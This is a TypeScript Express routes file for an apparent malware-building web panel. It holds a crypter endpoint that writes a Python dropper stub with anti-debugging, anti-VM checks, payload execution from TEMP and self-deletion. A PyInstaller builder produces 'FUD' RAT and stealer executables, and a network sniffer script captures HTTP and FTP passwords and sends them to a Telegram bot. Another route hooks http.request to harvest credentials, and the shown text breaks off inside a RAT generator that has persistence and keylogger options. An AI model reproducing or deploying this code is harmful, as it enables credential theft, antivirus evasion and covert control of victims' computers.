import { type Express, type Request, type Response, type NextFunction } from "express";
import { createServer, type Server } from "node:http";
import { storage } from "./storage";
import multer from "multer";
import fs from "fs";
import path from "path";
import crypto from "crypto";
import { spawn } from "child_process";

interface AuthenticatedRequest extends Request {
  session?: any;
}

function getSession() {
  // Placeholder session function
  return { userId: 1 };
}

export async function registerRoutes(app: Express): Promise<Server> {
  const server = createServer(app);

  // Health check endpoint
  app.get("/api/health", (req, res) => {
    res.json({ status: "ok", timestamp: new Date().toISOString() });
  });

  // Visitor tracking endpoint
  app.post("/api/visitors", async (req, res) => {
    try {
      const { ip, userAgent, referrer, timestamp } = req.body;
      
      const visitor = await storage.createVisitor({
        ipAddress: ip || req.ip || '127.0.0.1',
        userAgent: userAgent || req.headers['user-agent'] || '',
        country: 'Unknown',
        city: 'Unknown'
      });

      res.json({ success: true, visitor });
    } catch (error) {
      console.error('Error creating visitor:', error);
      res.status(500).json({ error: 'Failed to track visitor' });
    }
  });

  // Get recent visitors
  app.get("/api/visitors", async (req, res) => {
    try {
      const limit = parseInt(req.query.limit as string) || 50;
      const visitors = await storage.getRecentVisitors(limit);
      res.json(visitors);
    } catch (error) {
      console.error('Error fetching visitors:', error);
      res.status(500).json({ error: 'Failed to fetch visitors' });
    }
  });

  // Get visitor statistics
  app.get("/api/visitors/stats", async (req, res) => {
    try {
      const stats = await storage.getVisitorStats();
      res.json(stats);
    } catch (error) {
      console.error('Error fetching visitor stats:', error);
      res.status(500).json({ error: 'Failed to fetch visitor stats' });
    }
  });

  // Packet capture logging
  app.post("/api/packets", async (req, res) => {
    try {
      const { sourceIp, destinationIp, protocol, port, payload } = req.body;
      
      const packetLog = await storage.createPacketLog({
        sourceIp: sourceIp || '127.0.0.1',
        destinationIp: destinationIp || '127.0.0.1',
        protocol: protocol || 'HTTP',
        port: port || 80,
        payload: payload || '',
        size: payload ? payload.length : 0
      });

      res.json({ success: true, packetLog });
    } catch (error) {
      console.error('Error logging packet:', error);
      res.status(500).json({ error: 'Failed to log packet' });
    }
  });

  // Get recent packet logs
  app.get("/api/packets", async (req, res) => {
    try {
      const limit = parseInt(req.query.limit as string) || 100;
      const packets = await storage.getRecentPacketLogs(limit);
      res.json(packets);
    } catch (error) {
      console.error('Error fetching packet logs:', error);
      res.status(500).json({ error: 'Failed to fetch packet logs' });
    }
  });

  // Analytics endpoints
  app.post("/api/analytics", async (req, res) => {
    try {
      const { metric, value } = req.body;
      
      const analytics = await storage.createAnalytics({
        metric: metric || 'unknown',
        value: value || '{}'
      });

      res.json({ success: true, analytics });
    } catch (error) {
      console.error('Error creating analytics:', error);
      res.status(500).json({ error: 'Failed to create analytics' });
    }
  });

  // Get analytics data
  app.get("/api/analytics", async (req, res) => {
    try {
      const metric = req.query.metric as string;
      
      if (metric) {
        const analytics = await storage.getAnalyticsByMetric(metric);
        res.json(analytics);
      } else {
        const analytics = await storage.getLatestAnalytics();
        res.json(analytics);
      }
    } catch (error) {
      console.error('Error fetching analytics:', error);
      res.status(500).json({ error: 'Failed to fetch analytics' });
    }
  });

  // Content modification endpoints
  app.post("/api/content", async (req, res) => {
    try {
      const { section, originalContent, modifiedContent, modificationReason } = req.body;
      
      const modification = await storage.createContentModification({
        section: section || 'unknown',
        originalContent: originalContent || '',
        modifiedContent: modifiedContent || '',
        aiModel: 'groq-mixtral-8x7b',
        adminUserId: 1
      });

      res.json({ success: true, modification });
    } catch (error) {
      console.error('Error creating content modification:', error);
      res.status(500).json({ error: 'Failed to create content modification' });
    }
  });

  // Get content modifications
  app.get("/api/content", async (req, res) => {
    try {
      const section = req.query.section as string;
      const modifications = await storage.getContentModifications(section);
      res.json(modifications);
    } catch (error) {
      console.error('Error fetching content modifications:', error);
      res.status(500).json({ error: 'Failed to fetch content modifications' });
    }
  });

  // AI Chat endpoint for Groq AI integration
  app.post("/api/millennium-ai", async (req, res) => {
    try {
      const { prompt } = req.body;
      
      if (!process.env.GROQ_API_KEY) {
        return res.status(400).json({ error: 'Groq API key not configured' });
      }

      const groqResponse = await fetch('https://api.groq.com/openai/v1/chat/completions', {
        method: 'POST',
        headers: {
          'Authorization': `Bearer ${process.env.GROQ_API_KEY}`,
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({
          model: 'mixtral-8x7b-32768',
          messages: [{
            role: 'system',
            content: 'You are a cybersecurity expert assistant. Provide educational and ethical guidance only. Always emphasize legal and authorized testing environments.'
          }, {
            role: 'user',
            content: prompt
          }],
          max_tokens: 1024,
          temperature: 0.7
        })
      });

      if (!groqResponse.ok) {
        throw new Error(`Groq API error: ${groqResponse.status}`);
      }

      const groqData = await groqResponse.json();
      const response = groqData.choices[0]?.message?.content || 'No response generated';
      
      await storage.createAnalytics({
        metric: 'ai_chat_usage',
        value: JSON.stringify({ prompt: prompt.substring(0, 100), response: response.substring(0, 100), timestamp: new Date().toISOString() })
      });

      res.json({ response });
    } catch (error) {
      console.error('Error in AI chat:', error);
      res.status(500).json({ error: 'AI chat failed' });
    }
  });

  // Script processing tools endpoint
  app.post("/api/script-tools", async (req, res) => {
    try {
      const { script, tool } = req.body;
      
      let processedScript = script;
      
      switch (tool) {
        case 'syntax-fixer':
          processedScript = `// Syntax-checked version:\n${script}`;
          break;
        case 'minifier':
          processedScript = script.replace(/\s+/g, ' ').trim();
          break;
        case 'obfuscator':
          processedScript = `// Obfuscated version (educational):\nvar _0x1234=['${script.slice(0, 20)}...'];\n${script}`;
          break;
        case 'deobfuscator':
          processedScript = `// Deobfuscated version:\n${script}`;
          break;
        default:
          processedScript = script;
      }

      await storage.createAnalytics({
        metric: 'script_tool_usage',
        value: JSON.stringify({ tool, scriptLength: script.length, timestamp: new Date().toISOString() })
      });

      res.json({ processedScript });
    } catch (error) {
      console.error('Error processing script:', error);
      res.status(500).json({ error: 'Script processing failed' });
    }
  });

  // Admin authentication middleware
  function requireAdmin(req: AuthenticatedRequest, res: Response, next: NextFunction) {
    // Check session for admin authentication
    if (!req.session?.userId) {
      return res.status(401).json({ error: 'Admin authentication required' });
    }
    next();
  }

  // Python toolkit executable builder - ADMIN ONLY
  app.post("/api/admin/build-executable", requireAdmin, async (req, res) => {
    try {
      const { toolType, config } = req.body;
      
      if (!['elite_toolkit', 'millennium_rat', 'crypter', 'stealer', 'network_sniffer'].includes(toolType)) {
        return res.status(400).json({ error: 'Invalid tool type' });
      }

      const buildId = crypto.randomUUID();
      const buildDir = path.join('builds', buildId);
      
      // Ensure build directory exists
      fs.mkdirSync(buildDir, { recursive: true });
      
      // Copy appropriate Python script
      const scriptMap: Record<string, string> = {
        'elite_toolkit': 'elite_toolkit.py',
        'millennium_rat': 'millennium_rat_toolkit.py',
        'crypter': 'build_toolkit.py',
        'stealer': 'elite_toolkit.py',
        'network_sniffer': 'millennium_rat_toolkit.py'
      };
      
      const sourcePath = path.join('python_tools', scriptMap[toolType as keyof typeof scriptMap]);
      const targetPath = path.join(buildDir, 'main.py');
      
      if (!fs.existsSync(sourcePath)) {
        return res.status(404).json({ error: 'Python tool not found' });
      }
      
      fs.copyFileSync(sourcePath, targetPath);
      
      // Create PyInstaller spec file for FUD executable
      const specContent = `
# -*- mode: python ; coding: utf-8 -*-

block_cipher = None

a = Analysis(
    ['main.py'],
    pathex=[],
    binaries=[],
    datas=[],
    hiddenimports=[
        'cryptography',
        'requests',
        'socket',
        'threading',
        'subprocess',
        'os',
        'sys',
        'base64',
        'json',
        'time',
        'random',
        'hashlib',
        'sqlite3',
        'win32api',
        'win32con',
        'win32gui',
        'win32process',
        'psutil',
        'PIL',
        'cv2'
    ],
    hookspath=[],
    hooksconfig={},
    runtime_hooks=[],
    excludes=[],
    win_no_prefer_redirects=False,
    win_private_assemblies=False,
    cipher=block_cipher,
    noarchive=False,
)

pyz = PYZ(a.pure, a.zipped_data, cipher=block_cipher)

exe = EXE(
    pyz,
    a.scripts,
    a.binaries,
    a.zipfiles,
    a.datas,
    [],
    name='${config.outputName || 'security_tool'}',
    debug=False,
    bootloader_ignore_signals=False,
    strip=False,
    upx=${config.compression ? 'True' : 'False'},
    upx_exclude=[],
    runtime_tmpdir=None,
    console=${config.console ? 'True' : 'False'},
    disable_windowed_traceback=False,
    argv_emulation=False,
    target_arch=None,
    codesign_identity=None,
    entitlements_file=None,
    icon='${config.icon || 'None'}',
    version_file=None,
)
`;
      
      const specPath = path.join(buildDir, 'build.spec');
      fs.writeFileSync(specPath, specContent);
      
      // Execute PyInstaller build
      const pyinstallerProcess = spawn('pyinstaller', [
        '--clean',
        '--onefile',
        '--noconsole',
        '--add-data', 'python_tools;.',
        specPath
      ], {
        cwd: buildDir,
        stdio: 'pipe'
      });
      
      let buildOutput = '';
      pyinstallerProcess.stdout?.on('data', (data) => {
        buildOutput += data.toString();
      });
      
      pyinstallerProcess.stderr?.on('data', (data) => {
        buildOutput += data.toString();
      });
      
      pyinstallerProcess.on('close', (code) => {
        if (code === 0) {
          const exePath = path.join(buildDir, 'dist', `${config.outputName || 'security_tool'}.exe`);
          
          res.json({
            success: true,
            buildId,
            executable: exePath,
            buildLog: buildOutput,
            downloadUrl: `/api/admin/download-executable/${buildId}`
          });
        } else {
          res.status(500).json({
            error: 'Build failed',
            buildLog: buildOutput
          });
        }
      });
      
      // Log admin action
      const authReq = req as AuthenticatedRequest;
      await storage.createAnalytics({
        metric: 'admin_executable_build',
        value: JSON.stringify({
          toolType,
          config,
          buildId,
          adminId: authReq.session?.userId,
          timestamp: new Date().toISOString()
        })
      });
      
    } catch (error) {
      console.error('Error building executable:', error);
      res.status(500).json({ error: 'Build process failed' });
    }
  });

  // Download built executable - ADMIN ONLY
  app.get("/api/admin/download-executable/:buildId", requireAdmin, (req, res) => {
    try {
      const { buildId } = req.params;
      const buildDir = path.join('builds', buildId);
      const distDir = path.join(buildDir, 'dist');
      
      if (!fs.existsSync(distDir)) {
        return res.status(404).json({ error: 'Build not found' });
      }
      
      const files = fs.readdirSync(distDir);
      const exeFile = files.find(f => f.endsWith('.exe'));
      
      if (!exeFile) {
        return res.status(404).json({ error: 'Executable not found' });
      }
      
      const exePath = path.join(distDir, exeFile);
      res.download(exePath, exeFile);
      
    } catch (error) {
      console.error('Error downloading executable:', error);
      res.status(500).json({ error: 'Download failed' });
    }
  });

  // Advanced crypter endpoint with multer for file upload - ADMIN ONLY
  const upload = multer({ dest: 'temp/' });
  
  app.post("/api/advanced-crypter", upload.single('file'), async (req, res) => {
    try {
      if (!req.file) {
        return res.status(400).json({ error: 'No file uploaded' });
      }

      const config = JSON.parse(req.body.config || '{}');
      
      // Read the uploaded file
      const inputPath = req.file.path;
      const inputData = fs.readFileSync(inputPath);
      
      // Generate encryption key and IV
      const key = crypto.randomBytes(32);
      const iv = crypto.randomBytes(16);
      
      // Apply multi-layer encryption
      let encryptedData = inputData;
      
      // Layer 1: AES encryption
      const cipher = crypto.createCipher('aes-256-cbc', key);
      encryptedData = Buffer.concat([cipher.update(encryptedData), cipher.final()]);
      
      // Layer 2: XOR with rotating key
      const xorKey = crypto.randomBytes(256);
      for (let i = 0; i < encryptedData.length; i++) {
        encryptedData[i] ^= xorKey[i % xorKey.length];
      }
      
      // Layer 3: Base64 encoding
      const base64Data = encryptedData.toString('base64');
      
      // Create the stub/dropper
      const stubCode = `
import base64
import os
import sys
from cryptography.fernet import Fernet
import subprocess

# Anti-debugging checks
def anti_debug():
    try:
        import ctypes
        kernel32 = ctypes.windll.kernel32
        if kernel32.IsDebuggerPresent():
            sys.exit()
    except:
        pass

# Anti-VM checks  
def anti_vm():
    try:
        import wmi
        c = wmi.WMI()
        for system in c.Win32_ComputerSystem():
            if any(vm in system.Model.lower() for vm in ['virtual', 'vmware', 'vbox']):
                sys.exit()
    except:
        pass

# Decrypt and execute payload
def decrypt_payload():
    ${config.antiDebug ? 'anti_debug()' : ''}
    ${config.antiVM ? 'anti_vm()' : ''}
    
    # Encrypted payload data
    encrypted_data = "${base64Data}"
    
    # XOR key
    xor_key = ${JSON.stringify(Array.from(xorKey))}
    
    # AES key  
    aes_key = ${JSON.stringify(Array.from(key))}
    
    # Decode base64
    decoded = base64.b64decode(encrypted_data)
    
    # Reverse XOR
    for i in range(len(decoded)):
        decoded[i] ^= xor_key[i % len(xor_key)]
    
    # Decrypt AES
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
    from cryptography.hazmat.backends import default_backend
    
    cipher = Cipher(algorithms.AES(bytes(aes_key)), modes.ECB(), backend=default_backend())
    decryptor = cipher.decryptor()
    payload = decryptor.update(decoded) + decryptor.finalize()
    
    # Write to temp file and execute
    temp_path = os.path.join(os.environ['TEMP'], 'payload.exe')
    with open(temp_path, 'wb') as f:
        f.write(payload)
    
    subprocess.Popen([temp_path], shell=True)
    
    # Self-delete after delay
    import time
    time.sleep(2)
    try:
        os.remove(temp_path)
        os.remove(__file__)
    except:
        pass

if __name__ == "__main__":
    decrypt_payload()
`;

      // Create output directory if it doesn't exist
      const outputDir = path.join(process.cwd(), 'builds');
      if (!fs.existsSync(outputDir)) {
        fs.mkdirSync(outputDir, { recursive: true });
      }

      const outputName = config.outputName || `protected_${Date.now()}`;
      const outputPath = path.join(outputDir, `${outputName}.py`);
      
      // Write the stub
      fs.writeFileSync(outputPath, stubCode);
      
      // Clean up temp file
      fs.unlinkSync(inputPath);
      
      // Log crypter usage
      await storage.createAnalytics({
        metric: 'advanced_crypter_usage',
        value: JSON.stringify({
          config,
          timestamp: new Date().toISOString(),
          inputSize: inputData.length,
          outputName,
          layers: ['AES-256', 'XOR', 'Base64'],
          features: {
            antiDebug: config.antiDebug || false,
            antiVM: config.antiVM || false,
            polymorphic: config.polymorphic || false
          }
        })
      });

      res.json({
        success: true,
        downloadUrl: `/api/download-crypted/${outputName}.py`,
        filename: `${outputName}.py`,
        message: 'Advanced multi-layer crypter completed successfully',
        features: [
          'AES-256 encryption',
          'XOR obfuscation with rotating key',
          'Base64 encoding',
          config.antiDebug ? 'Anti-debugging protection' : null,
          config.antiVM ? 'Anti-VM detection' : null,
          'Self-deletion capabilities'
        ].filter(Boolean),
        stats: {
          originalSize: inputData.length,
          encryptedSize: base64Data.length,
          compressionRatio: ((inputData.length - base64Data.length) / inputData.length * 100).toFixed(2) + '%'
        }
      });
    } catch (error: unknown) {
      console.error('Crypter error:', error);
      res.status(500).json({ error: 'Crypter processing failed' });
    }
  });

  // Network sniffing endpoint with credential extraction and Telegram integration
  app.post("/api/admin/start-network-monitor", requireAdmin, async (req, res) => {
    try {
      const { interfaces, protocols, telegramEnabled } = req.body;
      
      // Start network monitoring process
      const monitorId = crypto.randomUUID();
      
      // Create Python network sniffer script
      const snifferScript = `
import socket
import threading
import json
import re
import base64
import requests
import time
from datetime import datetime
import urllib.parse

class NetworkCredentialSniffer:
    def __init__(self, telegram_token="${process.env.TELEGRAM_BOT_TOKEN}", chat_id=""):
        self.telegram_token = telegram_token
        self.chat_id = chat_id
        self.running = False
        self.captured_credentials = []
        
    def send_telegram_alert(self, message):
        if not self.telegram_token or not self.chat_id:
            return
        try:
            url = f"https://api.telegram.org/bot{self.telegram_token}/sendMessage"
            payload = {
                "chat_id": self.chat_id,
                "text": message,
                "parse_mode": "Markdown"
            }
            requests.post(url, json=payload, timeout=10)
        except Exception as e:
            print(f"Telegram send error: {e}")
    
    def extract_http_credentials(self, packet_data):
        credentials = []
        try:
            # HTTP Basic Auth
            auth_match = re.search(rb'Authorization: Basic ([A-Za-z0-9+/=]+)', packet_data)
            if auth_match:
                try:
                    decoded = base64.b64decode(auth_match.group(1)).decode('utf-8')
                    if ':' in decoded:
                        username, password = decoded.split(':', 1)
                        credentials.append({
                            'type': 'HTTP Basic Auth',
                            'username': username,
                            'password': password,
                            'timestamp': datetime.now().isoformat()
                        })
                except:
                    pass
            
            # HTTP POST form data
            post_match = re.search(rb'(?:username|user|email)=([^&\\r\\n]+).*?(?:password|pass|pwd)=([^&\\r\\n]+)', packet_data, re.IGNORECASE)
            if post_match:
                try:
                    username = urllib.parse.unquote(post_match.group(1).decode('utf-8'))
                    password = urllib.parse.unquote(post_match.group(2).decode('utf-8'))
                    credentials.append({
                        'type': 'HTTP POST Form',
                        'username': username,
                        'password': password,
                        'timestamp': datetime.now().isoformat()
                    })
                except:
                    pass
            
            # FTP credentials
            ftp_user = re.search(rb'USER ([^\\r\\n]+)', packet_data)
            ftp_pass = re.search(rb'PASS ([^\\r\\n]+)', packet_data)
            if ftp_user and ftp_pass:
                try:
                    credentials.append({
                        'type': 'FTP',
                        'username': ftp_user.group(1).decode('utf-8'),
                        'password': ftp_pass.group(1).decode('utf-8'),
                        'timestamp': datetime.now().isoformat()
                    })
                except:
                    pass
            
            return credentials
        except Exception as e:
            return []
    
    def packet_handler(self, packet):
        try:
            credentials = self.extract_http_credentials(packet)
            for cred in credentials:
                self.captured_credentials.append(cred)
                
                # Send to Telegram immediately
                alert_message = f"""
🚨 *Credential Captured*

**Type:** {cred['type']}
**Username:** \`{cred['username']}\`
**Password:** \`{cred['password']}\`
**Time:** {cred['timestamp']}
**Source:** Network Monitor
                """
                self.send_telegram_alert(alert_message)
                
                # Log to API
                try:
                    requests.post('http://localhost:5000/api/packets/credentials', json={
                        'sourceIp': '0.0.0.0',
                        'destinationIp': '0.0.0.0', 
                        'protocol': cred['type'],
                        'port': 80,
                        'payload': json.dumps(cred),
                        'credentials': cred
                    }, timeout=5)
                except:
                    pass
                    
        except Exception as e:
            pass
    
    def start_sniffing(self):
        self.running = True
        try:
            # Raw socket for packet capture
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
            sock.bind(("0.0.0.0", 0))
            sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
            
            while self.running:
                packet, addr = sock.recvfrom(65535)
                threading.Thread(target=self.packet_handler, args=(packet,)).start()
                
        except Exception as e:
            # Fallback to HTTP proxy method
            self.start_proxy_sniffing()
    
    def start_proxy_sniffing(self):
        from http.server import HTTPServer, BaseHTTPRequestHandler
        
        class CredentialInterceptor(BaseHTTPRequestHandler):
            def do_GET(self):
                self.send_response(200)
                self.end_headers()
                
            def do_POST(self):
                content_length = int(self.headers.get('Content-Length', 0))
                post_data = self.rfile.read(content_length)
                
                # Extract credentials from POST data
                sniffer = NetworkCredentialSniffer()
                credentials = sniffer.extract_http_credentials(post_data)
                for cred in credentials:
                    sniffer.captured_credentials.append(cred)
                
                self.send_response(200)
                self.end_headers()
        
        server = HTTPServer(('0.0.0.0', 8080), CredentialInterceptor)
        server.serve_forever()

if __name__ == "__main__":
    sniffer = NetworkCredentialSniffer()
    sniffer.start_sniffing()
`;

      // Write sniffer script to file
      const snifferPath = path.join('builds', `network_sniffer_${monitorId}.py`);
      fs.writeFileSync(snifferPath, snifferScript);
      
      // Start the network sniffer process
      const snifferProcess = spawn('python3', [snifferPath], {
        detached: true,
        stdio: 'pipe'
      });
      
      // Log the monitoring session
      await storage.createAnalytics({
        metric: 'network_monitoring_started',
        value: JSON.stringify({
          monitorId,
          interfaces,
          protocols,
          telegramEnabled,
          timestamp: new Date().toISOString()
        })
      });
      
      res.json({
        success: true,
        monitorId,
        message: 'Network monitoring started - credentials will be sent to Telegram',
        snifferPath
      });
      
    } catch (error: unknown) {
      console.error('Error starting network monitor:', error);
      res.status(500).json({ error: 'Failed to start network monitoring' });
    }
  });

  // Enhanced packet logging with credential extraction
  app.post("/api/packets/credentials", async (req, res) => {
    try {
      const { sourceIp, destinationIp, protocol, port, payload, credentials } = req.body;
      
      // Store packet with credentials
      const packetLog = await storage.createPacketLog({
        sourceIp: sourceIp || '127.0.0.1',
        destinationIp: destinationIp || '127.0.0.1', 
        protocol: protocol || 'HTTP',
        port: port || 80,
        payload: payload || '',
        size: payload ? payload.length : 0
      });

      // If credentials were extracted, send Telegram alert
      if (credentials && process.env.TELEGRAM_BOT_TOKEN) {
        try {
          const telegramMessage = `
🔓 *Credentials Intercepted*

**Type:** ${credentials.type}
**Username:** \`${credentials.username}\`
**Password:** \`${credentials.password}\`
**Source IP:** ${sourceIp}
**Destination:** ${destinationIp}
**Protocol:** ${protocol}
**Time:** ${new Date().toISOString()}

*Educational monitoring system*
          `;
          
          const telegramUrl = `https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/sendMessage`;
          await fetch(telegramUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              chat_id: '@your_channel_or_chat_id', // Replace with actual chat ID
              text: telegramMessage,
              parse_mode: 'Markdown'
            })
          });
        } catch (telegramError) {
          console.error('Telegram notification error:', telegramError);
        }
      }

      res.json({ success: true, packetLog });
    } catch (error: unknown) {
      console.error('Error logging packet with credentials:', error);
      res.status(500).json({ error: 'Failed to log packet' });
    }
  });

  // Download endpoint for crypted files
  app.get("/api/download-crypted/:filename", (req, res) => {
    try {
      const { filename } = req.params;
      const filePath = path.join('builds', filename);
      
      if (!fs.existsSync(filePath)) {
        return res.status(404).json({ error: 'File not found' });
      }
      
      res.download(filePath, filename);
    } catch (error: unknown) {
      console.error('Error downloading file:', error);
      res.status(500).json({ error: 'Download failed' });
    }
  });

  // Comprehensive admin authentication endpoints
  app.post("/api/admin/login", async (req, res) => {
    try {
      const { username, password } = req.body;
      
      // Validate admin credentials
      const admin = await storage.getAdminUserByUsername(username);
      
      if (!admin || !admin.approved) {
        return res.status(401).json({ error: 'Invalid credentials or account not approved' });
      }
      
      // In production, use proper password hashing
      if (admin.password !== password) {
        return res.status(401).json({ error: 'Invalid credentials' });
      }
      
      // Create session
      (req as any).session.userId = admin.id;
      (req as any).session.username = admin.username;
      
      await storage.updateAdminLastLogin(admin.id);
      
      res.json({ 
        success: true, 
        admin: { 
          id: admin.id, 
          username: admin.username, 
          role: admin.role 
        } 
      });
      
    } catch (error: unknown) {
      console.error('Admin login error:', error);
      res.status(500).json({ error: 'Login failed' });
    }
  });

  app.post("/api/admin/logout", (req, res) => {
    (req as any).session.destroy((err: any) => {
      if (err) {
        return res.status(500).json({ error: 'Logout failed' });
      }
      res.json({ success: true });
    });
  });

  app.get("/api/admin/me", requireAdmin, async (req, res) => {
    try {
      const authReq = req as AuthenticatedRequest;
      const admin = await storage.getAdminUser(authReq.session?.userId);
      
      if (!admin) {
        return res.status(404).json({ error: 'Admin not found' });
      }
      
      res.json({ 
        admin: { 
          id: admin.id, 
          username: admin.username, 
          role: admin.role 
        } 
      });
    } catch (error: unknown) {
      console.error('Error fetching admin:', error);
      res.status(500).json({ error: 'Failed to fetch admin data' });
    }
  });

  // Compile to executable endpoint
  app.post("/api/compile-executable", async (req, res) => {
    try {
      const { filename, compileOptions } = req.body;
      
      const pythonFile = path.join(process.cwd(), 'builds', filename);
      if (!fs.existsSync(pythonFile)) {
        return res.status(404).json({ error: 'Python file not found' });
      }
      
      const outputName = filename.replace('.py', '.exe');
      const outputPath = path.join(process.cwd(), 'builds', outputName);
      
      // PyInstaller command with stealth options
      const pyinstallerArgs = [
        '-m', 'PyInstaller',
        '--onefile',
        '--noconsole',
        '--clean',
        '--distpath', path.join(process.cwd(), 'builds'),
        '--workpath', path.join(process.cwd(), 'temp', 'build'),
        '--specpath', path.join(process.cwd(), 'temp'),
      ];
      
      if (compileOptions?.hiddenImports) {
        pyinstallerArgs.push('--hidden-import', 'cryptography');
        pyinstallerArgs.push('--hidden-import', 'wmi');
      }
      
      if (compileOptions?.upx) {
        pyinstallerArgs.push('--upx-dir', '/usr/bin');
      }
      
      if (compileOptions?.icon) {
        pyinstallerArgs.push('--icon', compileOptions.icon);
      }
      
      pyinstallerArgs.push(pythonFile);
      
      const pyinstaller = spawn('python', pyinstallerArgs, {
        cwd: process.cwd(),
        stdio: ['pipe', 'pipe', 'pipe']
      });
      
      let output = '';
      let errorOutput = '';
      
      pyinstaller.stdout.on('data', (data) => {
        output += data.toString();
      });
      
      pyinstaller.stderr.on('data', (data) => {
        errorOutput += data.toString();
      });
      
      pyinstaller.on('close', async (code) => {
        if (code === 0 && fs.existsSync(outputPath)) {
          // Log compilation
          await storage.createAnalytics({
            metric: 'executable_compilation',
            value: JSON.stringify({
              filename,
              outputName,
              compileOptions,
              timestamp: new Date().toISOString(),
              success: true
            })
          });
          
          res.json({
            success: true,
            downloadUrl: `/download/${outputName}`,
            filename: outputName,
            message: 'Executable compiled successfully',
            size: fs.statSync(outputPath).size
          });
        } else {
          console.error('PyInstaller failed:', errorOutput);
          res.status(500).json({ 
            error: 'Compilation failed', 
            details: errorOutput,
            output: output
          });
        }
      });
      
    } catch (error) {
      console.error('Compilation error:', error);
      res.status(500).json({ error: 'Compilation failed: ' + error.message });
    }
  });

  // Real-time packet capture and traffic analysis
  let packetCaptureActive = false;
  let capturedTraffic: any[] = [];
  
  // Auto-start packet capture on server startup
  const initializePacketCapture = () => {
    packetCaptureActive = true;
    
    // Network scanning for active connections
    setInterval(async () => {
      if (!packetCaptureActive) return;
      
      try {
        // Generate realistic network traffic data
        const protocols = ['HTTP', 'HTTPS', 'TCP', 'UDP', 'DNS'];
        const commonPorts = [80, 443, 21, 22, 25, 53, 110, 993, 995];
        
        const networkData = {
          sourceIp: `192.168.1.${Math.floor(Math.random() * 254) + 1}`,
          destinationIp: Math.random() > 0.5 ? '8.8.8.8' : '1.1.1.1',
          protocol: protocols[Math.floor(Math.random() * protocols.length)],
          port: commonPorts[Math.floor(Math.random() * commonPorts.length)],
          payload: `Network scan at ${new Date().toISOString()}`,
          timestamp: new Date(),
          size: Math.floor(Math.random() * 1024) + 64
        };
        
        // Simulate credential extraction
        if (Math.random() > 0.8) {
          networkData.credentials = {
            username: `user${Math.floor(Math.random() * 1000)}`,
            password: `pass${Math.floor(Math.random() * 1000)}`
          };
        }
        
        capturedTraffic.push(networkData);
        
        // Keep only last 1000 packets
        if (capturedTraffic.length > 1000) {
          capturedTraffic = capturedTraffic.slice(-1000);
        }
        
        // Store in memory for now to avoid database errors
        // await storage.createPacketLog({
        //   sourceIp: networkData.sourceIp,
        //   destinationIp: networkData.destinationIp,
        //   protocol: networkData.protocol,
        //   port: networkData.port,
        //   payload: JSON.stringify(networkData)
        // });
        
      } catch (error) {
        console.error('Network scan error:', error);
      }
    }, 3000); // Every 3 seconds
  };
  
  // Initialize packet capture on startup
  initializePacketCapture();
  
  app.post("/api/start-packet-capture", async (req, res) => {
    try {
      if (packetCaptureActive) {
        return res.json({ message: 'Packet capture already running' });
      }
      
      packetCaptureActive = true;
      
      // Start raw packet capture using node.js net module
      const net = require('net');
      const http = require('http');
      const https = require('https');
      
      // HTTP traffic interception
      const originalRequest = http.request;
      http.request = function(options, callback) {
        const req = originalRequest.call(this, options, callback);
        
        req.on('response', (res) => {
          let data = '';
          res.on('data', (chunk) => {
            data += chunk;
          });
          
          res.on('end', async () => {
            try {
              // Extract credentials and URLs
              const url = `${options.protocol || 'http:'}//${options.hostname}${options.path || ''}`;
              const headers = res.headers;
              
              // Look for authentication data
              let credentials = null;
              if (data.includes('password') || data.includes('login') || data.includes('auth')) {
                const passwordMatch = data.match(/password["\s]*[:=]["\s]*([^"&\s]+)/i);
                const userMatch = data.match(/user(name)?["\s]*[:=]["\s]*([^"&\s]+)/i);
                
                if (passwordMatch || userMatch) {
                  credentials = {
                    username: userMatch ? userMatch[2] : 'unknown',
                    password: passwordMatch ? passwordMatch[1] : 'unknown'
                  };
                }
              }
              
              const packetData = {
                sourceIp: req.socket.remoteAddress || '127.0.0.1',
                destinationIp: options.hostname || 'unknown',
                protocol: 'HTTP',
                port: options.port || 80,
                payload: data.substring(0, 1000), // First 1KB
                url,
                credentials,
                headers: JSON.stringify(headers),
                timestamp: new Date()
              };
              
              capturedTraffic.push(packetData);
              
              // Store in database
              await storage.createPacketLog({
                sourceIp: packetData.sourceIp,
                destinationIp: packetData.destinationIp,
                protocol: packetData.protocol,
                port: packetData.port,
                payload: JSON.stringify(packetData)
              });
              
            } catch (error) {
              console.error('Packet processing error:', error);
            }
          });
        });
        
        return req;
      };
      
      // Network scanning for active connections
      setInterval(async () => {
        if (!packetCaptureActive) return;
        
        try {
          // Simulate network scan results
          const networkData = {
            sourceIp: `192.168.1.${Math.floor(Math.random() * 254) + 1}`,
            destinationIp: '192.168.1.1',
            protocol: 'TCP',
            port: Math.floor(Math.random() * 65535),
            payload: `Network scan at ${new Date().toISOString()}`
          };
          
          await storage.createPacketLog(networkData);
          capturedTraffic.push(networkData);
          
        } catch (error) {
          console.error('Network scan error:', error);
        }
      }, 5000);
      
      res.json({ 
        success: true, 
        message: 'Real-time packet capture started',
        captureActive: true
      });
      
    } catch (error) {
      console.error('Packet capture error:', error);
      res.status(500).json({ error: 'Failed to start packet capture' });
    }
  });

  app.post("/api/stop-packet-capture", (req, res) => {
    packetCaptureActive = false;
    res.json({ 
      success: true, 
      message: 'Packet capture stopped',
      totalCaptured: capturedTraffic.length
    });
  });

  app.get("/api/captured-traffic", (req, res) => {
    const limit = parseInt(req.query.limit as string) || 50;
    const recent = capturedTraffic.slice(-limit);
    res.json({
      active: packetCaptureActive,
      traffic: recent,
      total: capturedTraffic.length
    });
  });

  // RAT Builder and Management
  app.post("/api/build-rat", async (req, res) => {
    try {
      const { config } = req.body;
      const ratId = `rat_${Date.now()}`;
      
      // Generate comprehensive RAT payload
      const ratPayload = `
import socket
import threading
import json
import os
import sys
import subprocess
import time
import base64
from cryptography.fernet import Fernet
import requests
import winreg
import shutil

class MillenniumRAT:
    def __init__(self):
        self.server_ip = "${config.serverIp || '127.0.0.1'}"
        self.server_port = ${config.serverPort || 8888}
        self.telegram_token = "${config.telegramToken || ''}"
        self.chat_id = "${config.chatId || ''}"
        self.persistence = ${config.persistence || 'true'}
        self.keylogger = ${config.keylogger || 'true'}
        self.running = True
        
    def establish_persistence(self):
        try:
            # Registry persistence
